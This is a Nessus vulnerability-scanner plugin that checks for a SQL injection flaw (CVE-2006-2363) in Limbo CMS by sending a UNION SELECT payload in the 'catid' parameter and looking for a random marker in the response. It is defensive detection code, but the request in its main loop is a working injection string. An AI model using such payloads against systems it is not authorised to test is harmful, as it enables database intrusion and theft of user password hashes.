#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21558);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-2363");
  script_bugtraq_id(17870);
  script_osvdb_id(25682);

  script_name(english:"Limbo weblinks.html.php catid Parameter SQL Injection");
  script_summary(english:"Tries to affect DB queries in Limbo CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a SQL
injection issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Limbo CMS, a content-management system
written in PHP. 

The version of Limbo CMS installed on the remote host fails to
sanitize input to the 'catid' parameter of the 'index.php' script
before using it in a database query.  An unauthenticated attacker may
be able to leverage this issue to manipulate SQL queries to uncover
password hashes for arbitrary users of the affected application. 

Note that successful exploitation requires that Limbo is configured to
use MySQL for its database backend, which is not the default." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/433221/30/0/threaded" );
 # http://web.archive.org/web/20070428083435/http://forum.limbofreak.com/index.php?topic=6.0
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3ecf65b1" );
 script_set_attribute(attribute:"solution", value:
"Apply Cumulative Patch v8 to Limbo 1.0.4.2." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(16, 89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/07");
 script_cvs_date("$Date: 2016/11/23 20:31:33 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/limbo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  magic = rand_str(length:12, charset:"0123456789");
  exploit = string("-1 UNION SELECT 0,1,2,", magic, ",4,5,6,7,8,9,10,11--");
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "option=weblinks&",
      "Itemid=2&",
      "catid=", urlencode(str:exploit)
    ),
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # we see our magic string and...
    string('div class="componentheading" >', magic) >< res &&
    # it looks like Limbo
    egrep(pattern:"Site powered By <a [^>]+>Limbo CMS<", string:res)
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
